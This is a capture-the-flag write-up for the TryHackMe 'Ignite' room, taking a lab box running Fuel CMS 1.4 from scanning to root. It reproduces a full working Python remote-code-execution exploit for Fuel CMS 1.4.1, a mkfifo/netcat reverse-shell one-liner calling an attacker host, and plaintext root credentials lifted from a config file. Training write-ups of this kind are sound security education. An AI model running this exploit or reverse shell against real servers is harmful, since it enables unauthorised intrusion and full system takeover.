---
title: "Ignite"
platform: "TryHackMe"
difficulty: "Easy"
date: "2026-02-25"
tags: ["web", "linux", "rce", "cms"]
excerpt: "A new start-up has a few issues with their web server."
icon: "https://tryhackme-images.s3.amazonaws.com/room-icons/676cb3273c613c9ba00688162efc0979.png"
roomUrl: "https://tryhackme.com/room/ignite"
---

## 🔍 Initial Access
Before diving into exploitation, we start with thorough reconnaissance. Understanding the attack surface is crucial - you can't exploit what you don't know exists.

---

## 🔎 Service Enumeration
A comprehensive Nmap scan was performed to identify open ports, running services, and operating system information:
``` bash
nmap -sC -sV -O -p- <TARGET_IP>
```

![Nmap Scan Screenshot](/assets/writeups/thm-rooms/ignite/nmap.png)

### 📊 Why this matters
- `-sC` runs default scripts → quick vulnerability hints  
- `-sV` detects service versions → useful for known exploits  
- `-O` enable operating system fingerprinting  
- `-p-` scans all ports (1–65535) → no port left unchecked (not just the default top 1000)

### 📌 Findings
- Port 80/TCP → HTTP service exposed as primary entry point
- Fuel CMS → content management system identified during banner grabbing
- No other open ports → the web application is our only attack vector

👉 The reconnaissance phase reveals a single attack vector: the Fuel CMS web application.

---

## 🌐 Web Enumeration
Navigating to the target web interface:
``` http
http://<TARGET_IP>
```

![Website Screenshot](/assets/writeups/thm-rooms/ignite/website.png)

The default Fuel CMS landing page discloses version 1.4, which becomes critical intelligence for vulnerability mapping.

### 📌 Why this matters
- Version disclosure helps identify known vulnerabilities
- Default installations often contain sensitive information
- CMS fingerprinting guides exploitation strategy

---

## ⚠️ Vulnerability Discovery
To confirm if the identified version is vulnerable, I searched for public exploits:
```bash
searchsploit "fuel cms"
```

![Searchsploit Screenshot](/assets/writeups/thm-rooms/ignite/searchsploit.png)

### 📌 Finding
Fuel CMS 1.4 has a known Remote Code Execution (RCE) vulnerability with a public exploit available.

### 🧠 Why this matters
At this stage, we already know:
- The exact CMS version  
- The service is exposed publicly  

So instead of guessing, we check if someone already broke it before.

👉 Finding a public RCE means:
- We don’t need credentials  
- We don’t need brute force  
- We can execute commands directly on the server  

---

## 💥 Exploitation

### 🛠️ Exploit Script Analysis
The public exploit works by injecting malicious payloads into a URL parameter that isn't properly sanitized. The vulnerable endpoint is:
```text
/fuel/pages/select/?filter=[malicious_payload]
```

The exploit script handles the URL encoding and payload crafting automatically:
``` python
#!/usr/bin/python3

import requests
from urllib.parse import quote
import argparse
import sys
from colorama import Fore, Style

def get_arguments():
        parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74')

        parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

        parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

        args = parser.parse_args()

        if len(sys.argv) <=2:
                parser.print_usage()
                sys.exit()

        return args


args = get_arguments()
url = args.url 

if "http" not in url:
        sys.stderr.write("Enter vaild url")
        sys.exit()

try:
   r = requests.get(url)
   if r.status_code == 200:
       print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)


except requests.ConnectionError:
    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
    sys.exit()

while True:
        cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)

        main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

        r = requests.get(main_url)

        output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
        print(output[0])
        if cmd == "exit":
                break
```

![Exploit Running Screenshot](/assets/writeups/thm-rooms/ignite/exploit.png)

### 🧠 What we’re doing here
The exploit interacts with the vulnerable endpoint and injects commands into a parameter that isn’t properly filtered.

Instead of manually crafting requests, this script:
- Sends the payload for us  
- Handles encoding  
- Prints the output  

👉 This gives us a simple way to run system commands remotely.

### 🎯 Gaining a Shell
Command execution via the exploit is functional but impractical for complex tasks. We need a proper shell.

👉 So we upgrade to a reverse shell.

#### Step 1: Start listener
On our attack machine:
```bash
nc -lvnp 4444
```

![Netcat Listener Screenshot](/assets/writeups/thm-rooms/ignite/listener.png)

##### 🧠 Why this step
We need something waiting to receive the connection from the target.
- `nc` listens on a port  
- The target will connect back to us  

#### Step 2: Trigger reverse shell
Using the exploit interface, we run:
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 > /tmp/f
```

![Reverse Shell Screenshot](/assets/writeups/thm-rooms/ignite/reverse_shell.png)

##### 🧠 Why this works
This command:
- Creates a communication channel (named pipe)  
- Spawns a shell  
- Redirects input/output through netcat  

👉 Result: we get an interactive shell as `www-data`.

### ⚙️ Shell Stabilization
The initial shell lacks many features (no tab completion, limited history, poor signal handling). We upgrade to a fully functional TTY:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![TTY Upgrade Screenshot](/assets/writeups/thm-rooms/ignite/tty.png)

#### 🧠 Why we do this
The initial shell is limited and unstable.
Upgrading it gives us a proper interactive terminal, making further enumeration much easier.

---

## 🏁 User Flag
After stabilizing the shell, I started looking around the system for useful files.

Since we are running as `www-data`, checking its home directory is a good starting point.

``` bash
cat /home/www-data/flag.txt
```

![User Flag Screenshot](/assets/writeups/thm-rooms/ignite/user_flag.png)

---

## 📈 Privilege Escalation
Now that we have a foothold, we need to escalate to root privileges.

``` bash
sudo -l
```

![Sudo Check Screenshot](/assets/writeups/thm-rooms/ignite/sudo.png)

### 📌 Result
The system prompts for a password.
👉 Since we don’t know the password, this path is blocked (for now).

### 🔍 Configuration File Hunting
Earlier web enumeration revealed documentation mentioning database configuration files. This is a common oversight - developers often leave credentials in configuration files.

I checked the default Fuel CMS database configuration path:
```bash
cat /var/www/html/fuel/application/config/database.php
```

![Database Config Screenshot](/assets/writeups/thm-rooms/ignite/database_config.png)

**Critical discovery**: The database configuration contains:
- Database username: `root`  
- Database password: `mememe (plaintext)`  
- Database name: `fuel_schema`  

👉 This is a common mistake in web apps.

### 👑 Root Access
With root credentials discovered, privilege escalation is straightforward:
```bash
su root
```

![Root Login Screenshot](/assets/writeups/thm-rooms/ignite/root_login.png)

**Why this worked**:
- Database configuration files often contain reused credentials  
- The root MySQL password was also the system root password  
- Poor password hygiene across services  

---

## 🏁 Root Flag
With root access, we can read the final flag:
``` bash
cat /root/root.txt
```

![Root Flag Screenshot](/assets/writeups/thm-rooms/ignite/root_flag.png)

---

## 📚 Key Takeaways
- **Version disclosure** → led to public RCE exploit
- **Config files** → database credentials gave root access
- **Password reuse** → same password for MySQL and system root
- **Always upgrade your shell** → PTY makes enumeration smoother

**Bottom line:** One vulnerable CMS + one exposed config file = full system compromise.
